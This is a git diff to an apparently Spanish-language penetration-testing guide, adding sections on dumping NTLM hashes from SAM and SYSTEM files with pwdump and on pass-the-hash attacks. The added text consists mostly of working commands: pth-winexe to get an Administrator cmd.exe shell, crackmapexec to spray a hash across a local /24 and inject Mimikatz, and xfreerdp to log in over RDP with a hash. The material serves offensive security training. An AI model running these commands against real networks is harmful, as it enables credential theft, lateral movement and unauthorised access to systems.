@@ -42,6 +42,8 @@
         * [Transferencia de Archivos](#transferencia-de-archivos)
         * [Evasión de Antivirus con Malware Genético](#av-evasion-genetic-malware)
         * [Port Forwarding y Técnicas de Enrutamiento](#windows-port-forwarding)
+        * [Hashdump Manual](#hashdump-manual)
+        * [PassTheHash](#passthehash)
           
 Antecedentes
 ===============================================================================================================================
@@ -1473,3 +1475,42 @@ Simplemente creamos un fichero _ip_ con nuestra IP local (127.0.0.1) y aplicamos
 cme smb ip --gen-relay-list ip
 ```
 
+#### Hashdump Manual
+
+Desde Metasploit, uno está acostumbrado a utilizar el **hashdump** para dumpear los hashes NTLM del sistema, así como el auxiliar. A continuación se detalla el procedimiento manual para el volcado de hashes NTLM, haciendo uso para ello de la herramienta **pwdump**.
+
+Es tan sencillo como traerse con privilegios de administrador, los recursos **SAM** y **System** del equipo. Una vez transferidos, aplicamos el siguiente comando desde terminal en nuestro equipo:
+
+```bash
+pwdump system SAM
+```
+
+Directamente, veremos los Hashes NTLM de los usuarios, los cuales posteriormente en caso de figurar el servicio samba abierto podemos aprovechar para hacer **PassTheHash**.
+
+#### PassTheHash
+
+A la hora de contar con un Hash NTLM válido de usuario, por ejemplo para este caso práctico, de Administrador, podemos llevar a cabo una autenticación contra el sistema a fin de conseguir una Shell interactiva a través del servicio Samba.
+
+Para ello, podemos utilizar herramientas como **pth-winexe**, la cual nos permite hacer conexiones como la siguiente:
+
+```bash
+pth-winexe -U WORKGROUP/Administrator%aad3c435b514a4eeaad3b935b51304fe:c46b9e588fa0d112de6f59fd6d58eae3 //192.168.1.5 cmd.exe
+```
+
+Como es de obviar, este paso nos ahorra el tener que crackear la contraseña. El hecho de poseer el Hash NTLM de un usuario, nos permite entre otras cosas ser aprovechado para elaborar un **sprying de credenciales** a nivel de red local:
+
+```bash
+crackmapexec smb 192.168.1.0/24 -u 'Administrator' -H aad3c435b514a4eeaad3b935b51304fe:c46b9e588fa0d112de6f59fd6d58eae3 
+```
+
+Obteniendo un **pwned** en caso de lograr la autenticación para algunos de los Hosts probados. A su vez, su uso puede ser útil para inyectar **Mimikatz** desde el propio **crackmapexec**, de la siguiente forma:
+
+```bash
+crackmapexec smb 192.168.1.45 -u 'Administrator ' -H aad3c435b514a4eeaad3b935b51304fe:c46b9e588fa0d112de6f59fd6d58eae3 -M mimikatz
+```
+
+También habría servido contra todo el rango /24. Su uso también puede ser utilizado incluso para en caso de no conocer la contraseña en claro, realizar autenticaciones vía **RDP**:
+
+```bash
+xfreerdp /u:Administrator /pth:c46b9e588fa0d112de6f59fd6d58eae3 /v:192.168.1.5
+```
